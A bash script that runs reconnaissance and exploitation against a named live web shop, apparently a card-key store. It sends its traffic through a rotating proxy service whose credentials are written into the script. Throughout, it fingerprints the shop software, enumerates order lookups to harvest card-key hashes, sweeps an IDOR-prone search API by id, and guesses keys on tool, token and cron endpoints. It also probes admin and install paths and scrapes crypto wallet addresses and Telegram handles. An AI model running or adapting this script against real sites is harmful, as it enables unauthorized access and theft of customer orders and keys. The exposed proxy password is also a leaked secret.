#!/bin/bash
# kk987.top/shop — P1 fingerprint + SUCCESS_CASES migration + oracles
set -u
KEY=C413ED6D; PW=344F550A6F8B
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://kk987.top/shop
ROOT=https://kk987.top
OUT=/tmp/kk987_out; CK=/tmp/kk987.ck; LOG=/tmp/kk987_p1.log
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee "$LOG") 2>&1

refresh(){
  RESP=$(curl -s --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception: print('')" "$RESP")
  [[ -n "$SERVER" ]] && PROXY_URL="http://${KEY}:${PW}@${SERVER}"
  echo "PROXY=$PROXY_URL"
}
c(){ curl -sk --connect-timeout 8 --max-time 30 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" "$@"; }

for i in 1 2 3 4 5 6 7 8; do
  refresh
  code=$(curl -sk --max-time 30 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -o "$OUT/home.html" -w "%{http_code}" "$BASE/")
  echo WARM=$code
  [[ "$code" == "200" ]] && break
done

echo '===== DNS / headers ====='
getent hosts kk987.top || true
c -I "$BASE/" | head -20

echo '===== fingerprint ====='
python3 - <<'PY'
import re
h=open('/tmp/kk987_out/home.html',encoding='utf-8',errors='ignore').read()
print('len',len(h))
print('title', re.search(r'<title>([^<]+)',h).group(1) if re.search(r'<title>([^<]+)',h) else None)
for pat in [r'assets/faka', r'csrf', r'hashsalt', r'彩虹', r'YKFAKA', r'Get_Yk_KC', r'Query_Km', r'ajax\.php', r'geetest', r'gt\s*[:=]', r'USDT', r't\.me/[A-Za-z0-9_]+', r'@[A-Za-z0-9_]{4,}']:
    ms=re.findall(pat,h,re.I)
    if ms: print(pat, '=>', list(dict.fromkeys(ms))[:12])
print('csrf', bool(re.search(r'csrf_token\s*=\s*[\"\']([^\"\']+)',h)))
PY

echo '===== getcount / siteinfo / goods ====='
c -X POST -H 'X-Requested-With: XMLHttpRequest' "$BASE/ajax.php?act=getcount" | tee "$OUT/getcount.json"; echo
for act in siteinfo classlist goodslist; do
  echo "--- %61pi act=$act ---"
  c "$BASE/%61pi.php?act=$act" | tee "$OUT/${act}.json" | head -c 400; echo
done
# plain api.php
echo '--- api.php siteinfo ---'
c "$BASE/api.php?act=siteinfo" -w '|%{http_code}\n' | head -c 200; echo

echo '===== SUCCESS: qd93 mod=query&data= ====='
for data in 1 2 0 00 01 12 88 99 2026 202608 138 139 150 188; do
  code=$(c "$BASE/?mod=query&data=$data" -o "$OUT/qd_$data.html" -w '%{http_code}')
  python3 - <<PY
import re
h=open('/tmp/kk987_out/qd_$data.html',encoding='utf-8',errors='ignore').read()
so=re.findall(r"showOrder\((\d+)\s*,\s*'([a-f0-9]{32})'\)", h)
fk=re.findall(r'mod=faka&id=(\d+)&skey=([a-f0-9]{32})', h)
print(f"data=$data HTTP=$code len={len(h)} showOrder={len(so)} faka={len(fk)} empty={'没有查询' in h or '没有查询到' in h}")
if so: print('  SO', so[:5])
if fk: print('  FK', fk[:5])
PY
done

echo '===== SUCCESS: 79yj api search IDOR ====='
for id in 1 10 50 100 200 500 1000 2000 5000; do
  body=$(c "$BASE/%61pi.php?act=search&id=$id")
  echo "search id=$id => ${body:0:180}"
done
for id in 1 100 1000; do
  body=$(c "$BASE/api.php?act=search&id=$id" -w '|%{http_code}')
  echo "api.php search id=$id => ${body:0:180}"
done

echo '===== SUCCESS: YKFAKA null paths (expect N/A if rainbow) ====='
for u in \
  "$ROOT/Get_Yk_KC.html?gid=1" \
  "$ROOT/Query_Km/1" \
  "$BASE/Get_Yk_KC.html?gid=1" \
  "$BASE/Query_Km/1"
do
  code=$(curl -sk --max-time 15 -x "$PROXY_URL" -A "$UA" -o /dev/null -w '%{http_code}' "$u")
  echo "$u => $code"
done

echo '===== oracles ====='
for k in '' test 123456; do
  echo "tools [$k] => $(c -G --data-urlencode "act=tools" --data-urlencode "key=$k" "$BASE/%61pi.php")"
  echo "token [$k] => $(c -G --data-urlencode "act=token" --data-urlencode "key=$k" "$BASE/%61pi.php")"
  echo "clone [$k] => $(c -G --data-urlencode "act=clone" --data-urlencode "key=$k" "$BASE/%61pi.php")"
  echo "cron [$k] => $(c "$BASE/cron.php?key=$k" | head -c 80)"
done
echo "card_check => $(c -X POST -H 'X-Requested-With: XMLHttpRequest' --data 'card=test123' "$BASE/ajax.php?act=card_check")"
echo "gift => $(c -X POST -H 'X-Requested-With: XMLHttpRequest' "$BASE/ajax.php?act=gift_start")"

echo '===== login / install / admin ====='
for u in "$BASE/?mod=login" "$BASE/admin/" "$BASE/install/" "$ROOT/admin/" "$BASE/toollogs.php"; do
  code=$(c -o /dev/null -w '%{http_code}' "$u")
  echo "$u => $code"
done
c "$BASE/?mod=login" -o "$OUT/login.html"
python3 - <<'PY'
import re,json
h=open('/tmp/kk987_out/login.html',encoding='utf-8',errors='ignore').read()
print('gt', re.findall(r'gt["\']?\s*[:=]\s*["\']([a-f0-9]+)', h)[:3])
# captcha endpoint
PY
CSRF=$(python3 -c "import re;h=open('/tmp/kk987_out/home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\s*=\s*[\"\']([^\"\']+)',h);print(m.group(1) if m else '')")
echo CSRF=$CSRF
c -X POST -H 'X-Requested-With: XMLHttpRequest' --data "csrf_token=$CSRF" "$BASE/ajax.php?act=captcha" | tee "$OUT/captcha.json"; echo

echo '===== goods summary ====='
python3 - <<'PY'
import json
try:
  g=json.load(open('/tmp/kk987_out/goodslist.json'))
  data=g.get('data') or g
  if isinstance(data,dict): data=data.get('list') or data.get('data') or []
  print('goods', len(data) if isinstance(data,list) else type(data))
  if isinstance(data,list):
    inst=[]
    for x in data:
      try: st=int(x.get('stock') or 0)
      except: st=0
      if st>0: inst.append(x)
    print('instock',len(inst))
    for x in sorted(inst,key=lambda z:float(z.get('price') or 0))[:10]:
      print(x.get('tid'), x.get('price'), x.get('stock'), (x.get('name') or '')[:50])
except Exception as e:
  print('goods parse err',e)
  print(open('/tmp/kk987_out/goodslist.json').read()[:300])
PY

echo '===== siteinfo parse ====='
python3 - <<'PY'
import json,re
try:
  s=json.load(open('/tmp/kk987_out/siteinfo.json'))
except Exception as e:
  print('siteinfo err',e); raise SystemExit
print('sitename', s.get('sitename'))
print('build', s.get('build'), 'version', s.get('version'))
print('kfqq', s.get('kfqq'))
an=s.get('anounce') or ''
print('Taddr', re.findall(r'T[1-9A-HJ-NP-Za-km-z]{33}', an)[:5])
print('tg', re.findall(r't\.me/[A-Za-z0-9_]+|@[A-Za-z0-9_]{4,}', an)[:10])
print('USDT', 'USDT' in an.upper())
PY

echo '===== P1 DONE ====='
